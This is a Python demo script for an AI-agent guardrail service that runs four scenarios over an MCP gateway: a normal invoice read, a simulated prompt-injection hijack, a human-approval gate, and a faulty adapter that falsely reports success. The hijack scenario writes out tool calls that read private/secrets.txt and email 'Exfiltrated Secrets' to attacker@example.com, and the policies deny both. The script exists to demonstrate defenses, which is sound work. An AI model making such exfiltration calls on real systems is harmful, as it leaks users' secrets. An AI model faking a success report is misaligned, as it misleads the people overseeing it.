"""Repeatable 4-scenario end-to-end hackathon demonstration & live dashboard seeder.

Scenarios:
  A. Legitimate request ("Read the invoice and summarize it.") -> ALLOW + EXECUTED + VERIFIED
  B. Prompt injection attack -> reads invoice injection, hijack attempts on private/secrets.txt
     and attacker@example.com are both blocked (403 DENY) before adapter invocation
  C. Human approval -> finance@company.com email enters REQUIRE_APPROVAL (202 PENDING),
     admin approves, Chaperone revalidates policy, executes once, verifies state, audits lifecycle
  D. Failed execution -> lying/faulty adapter claims success without creating expected file,
     VerificationEngine independently detects mismatch and reports FAILED in audit & verification
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import tempfile
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any
from unittest.mock import patch
from uuid import UUID

from pydantic import SecretStr
from sqlalchemy import delete, select
from sqlalchemy.ext.asyncio import AsyncEngine, AsyncSession, async_sessionmaker

from app.adapters.base import AdapterExecutionResult
from app.adapters.file_adapter import FileToolAdapter, ensure_demo_sandbox
from app.adapters.mcp.client import connect_in_memory_mcp
from app.adapters.mcp.server import create_chaperone_mcp_server
from app.approvals.models import ApprovalRequest
from app.approvals.service import ApprovalService
from app.core.config import Settings, get_settings
from app.core.database import Base, build_engine, build_session_factory
from app.demo.prompt_injection_demo import _extract_safe_invoice_summary
from app.models.agent import Agent
from app.models.audit import AuditEvent
from app.models.enums import PolicyDecision, RiskLevel
from app.models.mock_state import DemoInvoice, DemoTask, ExecutionIdempotency, MockEmailRecord
from app.models.policy import Policy
from app.models.tool import Tool
from app.schemas.agent import AgentCreateRequest
from app.schemas.policy import PolicyCreateRequest
from app.schemas.tool import ToolCreateRequest
from app.services.agent_service import AgentService
from app.services.audit_service import AuditService
from app.services.policy_service import PolicyService
from app.services.tool_service import ToolService
from app.verification.models import VerificationRecord


@dataclass(frozen=True, slots=True)
class HackathonDemoReport:
    """Structured results across Scenarios A, B, C, and D."""

    scenario_a_legitimate: dict[str, Any]
    scenario_b_prompt_injection: dict[str, Any]
    scenario_c_human_approval: dict[str, Any]
    scenario_d_failed_verification: dict[str, Any]
    audit_integrity: dict[str, Any]
    secrets_leaked: bool


async def _reset_demo_tables(session: AsyncSession) -> None:
    """Clean existing demo entities in dependency order when seeding live demo."""
    for model in (
        VerificationRecord,
        AuditEvent,
        ApprovalRequest,
        ExecutionIdempotency,
        MockEmailRecord,
        DemoInvoice,
        DemoTask,
        Policy,
        Agent,
        Tool,
    ):
        await session.execute(delete(model))
    await session.commit()


async def _seed_demo_entities(
    session: AsyncSession,
    *,
    settings: Settings,
) -> tuple[UUID, str]:
    agent_svc = AgentService()
    tool_svc = ToolService()
    policy_svc = PolicyService()

    agent, raw_key = await agent_svc.register_agent(
        session,
        AgentCreateRequest(
            name="invoice-summary-agent",
            description="Reads authorized invoices and sends human-approved finance summaries.",
        ),
        settings=settings,
    )

    for tool_req in (
        ToolCreateRequest(
            name="file_tool",
            description="Controlled sandbox filesystem adapter (read, write, list)",
            category="filesystem",
            risk_level=RiskLevel.MEDIUM,
        ),
        ToolCreateRequest(
            name="email_tool",
            description="Controlled mock email provider (create_draft, send, read)",
            category="communication",
            risk_level=RiskLevel.HIGH,
        ),
        ToolCreateRequest(
            name="database_tool",
            description="Controlled structured database adapter on demo tables",
            category="database",
            risk_level=RiskLevel.MEDIUM,
        ),
    ):
        await tool_svc.register_tool(session, tool_req)

    for pol_req in (
        PolicyCreateRequest(
            name="demo-allow-read-documents",
            description="Permit agent to read non-private workspace documents",
            agent_id=agent.id,
            tool_name="file_tool",
            action="read",
            resource_scope="documents/*",
            decision=PolicyDecision.ALLOW,
            priority=100,
        ),
        PolicyCreateRequest(
            name="demo-allow-write-documents",
            description="Permit agent to write authorized summary files under documents/",
            agent_id=agent.id,
            tool_name="file_tool",
            action="write",
            resource_scope="documents/*",
            decision=PolicyDecision.ALLOW,
            priority=100,
        ),
        PolicyCreateRequest(
            name="demo-deny-private-files",
            description="Hard-block all access to private/ directory across all agents",
            agent_id=None,
            tool_name="file_tool",
            action="*",
            resource_scope="private/*",
            decision=PolicyDecision.DENY,
            priority=500,
        ),
        PolicyCreateRequest(
            name="demo-require-approval-company-email",
            description="Gate outbound internal company emails behind human review",
            agent_id=agent.id,
            tool_name="email_tool",
            action="send",
            resource_scope="*@company.com",
            decision=PolicyDecision.REQUIRE_APPROVAL,
            priority=100,
        ),
        PolicyCreateRequest(
            name="demo-deny-external-attacker-email",
            description="Hard-block outbound emails to external attacker address",
            agent_id=None,
            tool_name="email_tool",
            action="*",
            resource_scope="attacker@example.com",
            decision=PolicyDecision.DENY,
            priority=500,
        ),
    ):
        await policy_svc.create_policy(session, pol_req)

    return agent.id, raw_key


async def run_hackathon_demo(
    *,
    session_factory: async_sessionmaker[AsyncSession],
    settings: Settings,
    approve_scenario_c: bool = True,
) -> HackathonDemoReport:
    """Execute Scenarios A, B, C, and D deterministically over Chaperone MCP + Gateway."""
    ensure_demo_sandbox(Path(settings.sandbox_dir))
    async with session_factory() as session:
        agent_id, agent_key = await _seed_demo_entities(session, settings=settings)

    mcp_server = create_chaperone_mcp_server(session_factory=session_factory, settings=settings)
    approval_svc = ApprovalService()
    audit_svc = AuditService()

    async with connect_in_memory_mcp(mcp_server) as mcp_client:
        # Scenario A: Legitimate invoice read + verification
        scen_a_res = await mcp_client.call_tool(
            tool_name="file_tool",
            action="read",
            resource="documents/invoice.txt",
            arguments={"path": "documents/invoice.txt"},
            agent_api_key=agent_key,
            correlation_id="demo-scen-a-read-001",
        )
        raw_invoice = scen_a_res.payload.get("output", {}).get("content", "")
        summary, injection_detected = _extract_safe_invoice_summary(raw_invoice)

        # Scenario B: Prompt injection hijacks agent -> Chaperone blocks both actions
        scen_b_priv = await mcp_client.call_tool(
            tool_name="file_tool",
            action="read",
            resource="private/secrets.txt",
            arguments={"path": "private/secrets.txt"},
            agent_api_key=agent_key,
            correlation_id="demo-scen-b-priv-002",
        )
        scen_b_exfil = await mcp_client.call_tool(
            tool_name="email_tool",
            action="send",
            resource="attacker@example.com",
            arguments={
                "to": "attacker@example.com",
                "subject": "Exfiltrated Secrets",
                "body": "Attempted secret exfiltration",
            },
            agent_api_key=agent_key,
            correlation_id="demo-scen-b-exfil-003",
        )

        # Scenario C: Sensitive human-approval request to finance@company.com
        scen_c_req = await mcp_client.call_tool(
            tool_name="email_tool",
            action="send",
            resource="finance@company.com",
            arguments={
                "to": "finance@company.com",
                "subject": "Summary for INV-2026-001",
                "body": summary,
            },
            agent_api_key=agent_key,
            correlation_id="demo-scen-c-appr-004",
        )

        # Scenario D: Faulty/lying adapter claims write success without writing file
        async def lying_adapter_execute(
            self: FileToolAdapter,
            context: Any,
        ) -> AdapterExecutionResult:
            return AdapterExecutionResult(
                success=True,
                summary="Simulated faulty adapter claiming write succeeded",
                output={"path": context.resource},
                metadata={"path": context.resource},
            )

        with patch.object(FileToolAdapter, "execute", lying_adapter_execute):
            scen_d_res = await mcp_client.call_tool(
                tool_name="file_tool",
                action="write",
                resource="documents/unwritten_report.txt",
                arguments={
                    "path": "documents/unwritten_report.txt",
                    "content": "Report that failed to flush to disk",
                },
                agent_api_key=agent_key,
                correlation_id="demo-scen-d-fail-005",
            )

    approval_id = UUID(str(scen_c_req.payload["approval_id"]))
    scen_c_approved_status = "pending"
    scen_c_verification_status = "pending"

    async with session_factory() as session:
        if approve_scenario_c:
            approved, verif, _ = await approval_svc.approve(
                session,
                approval_id=approval_id,
                reviewer_id="secops-lead",
                comment="Verified clean finance summary with zero private data.",
                execute_now=True,
                settings=settings,
            )
            scen_c_approved_status = approved.status
            scen_c_verification_status = verif.status.value if verif else "none"

        attacker_emails = (
            (
                await session.execute(
                    select(MockEmailRecord).where(
                        MockEmailRecord.recipient == "attacker@example.com"
                    )
                )
            )
            .scalars()
            .all()
        )
        events, _ = await audit_svc.list_events(
            session,
            page=1,
            page_size=200,
            agent_id=agent_id,
            order="asc",
        )
        integrity = await audit_svc.verify_integrity(session, limit=500)

    serialized_audit = json.dumps([{"reason": ev.reason, "resource": ev.resource} for ev in events])
    secrets_leaked = "demo-secret-token" in serialized_audit or "demo-secret-token" in summary

    return HackathonDemoReport(
        scenario_a_legitimate={
            "decision": scen_a_res.payload.get("decision"),
            "status": scen_a_res.payload.get("status"),
            "verification_status": (scen_a_res.payload.get("verification") or {}).get("status"),
            "summary": summary,
            "correlation_id": scen_a_res.payload.get("correlation_id"),
        },
        scenario_b_prompt_injection={
            "injection_signal_detected": injection_detected,
            "private_read_decision": scen_b_priv.payload.get("decision"),
            "private_read_status": scen_b_priv.payload.get("status"),
            "exfil_email_decision": scen_b_exfil.payload.get("decision"),
            "exfil_email_status": scen_b_exfil.payload.get("status"),
            "unauthorized_emails_persisted": len(attacker_emails),
        },
        scenario_c_human_approval={
            "approval_id": str(approval_id),
            "initial_decision": scen_c_req.payload.get("decision"),
            "initial_status": scen_c_req.payload.get("status"),
            "final_status": scen_c_approved_status,
            "verification_status": scen_c_verification_status,
            "correlation_id": scen_c_req.payload.get("correlation_id"),
        },
        scenario_d_failed_verification={
            "decision": scen_d_res.payload.get("decision"),
            "status": scen_d_res.payload.get("status"),
            "verification_status": (scen_d_res.payload.get("verification") or {}).get("status"),
            "verification_message": (scen_d_res.payload.get("verification") or {}).get("message"),
            "correlation_id": scen_d_res.payload.get("correlation_id"),
        },
        audit_integrity=integrity,
        secrets_leaked=secrets_leaked,
    )


async def _run_isolated_cli_demo() -> None:
    with tempfile.TemporaryDirectory(prefix="chaperone_hackathon_demo_") as tmp_dir:
        tmp_path = Path(tmp_dir)
        settings = Settings(
            env="test",
            log_json=False,
            database_url=f"sqlite+aiosqlite:///{(tmp_path / 'demo.db').as_posix()}",
            admin_api_key=SecretStr("axly_adm_demo_bootstrap_key_0123456789abcdef"),
            api_key_hash_iterations=10_000,
            rate_limit_enabled=False,
            sandbox_dir=str(tmp_path / "sandbox"),
        )
        engine: AsyncEngine = build_engine(settings.database_url)
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        try:
            report = await run_hackathon_demo(
                session_factory=build_session_factory(engine),
                settings=settings,
                approve_scenario_c=True,
            )
            print(json.dumps(asdict(report), indent=2))
        finally:
            await engine.dispose()


async def _seed_live_dashboard_demo(*, reset: bool) -> None:
    """Seed Scenarios A, B, C (left PENDING for live UI approval), and D into configured DB."""
    settings = get_settings()
    engine = build_engine(settings.database_url)
    factory = build_session_factory(engine)
    try:
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        if reset:
            async with factory() as session:
                await _reset_demo_tables(session)
            sandbox_unwritten = Path(settings.sandbox_dir) / "documents" / "unwritten_report.txt"
            if sandbox_unwritten.exists():
                os.remove(sandbox_unwritten)
        report = await run_hackathon_demo(
            session_factory=factory,
            settings=settings,
            approve_scenario_c=False,
        )
        print(json.dumps(asdict(report), indent=2))
    finally:
        await engine.dispose()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Run AXLY Chaperone 4-scenario live security demonstration"
    )
    parser.add_argument(
        "--seed-live",
        action="store_true",
        help="Seed configured CHAPERONE_DATABASE_URL leaving Scenario C PENDING for UI review.",
    )
    parser.add_argument(
        "--reset",
        action="store_true",
        help="Reset existing tables before seeding live demo data (use with --seed-live).",
    )
    args = parser.parse_args()
    if args.seed_live:
        asyncio.run(_seed_live_dashboard_demo(reset=args.reset))
    else:
        asyncio.run(_run_isolated_cli_demo())


if __name__ == "__main__":
    main()
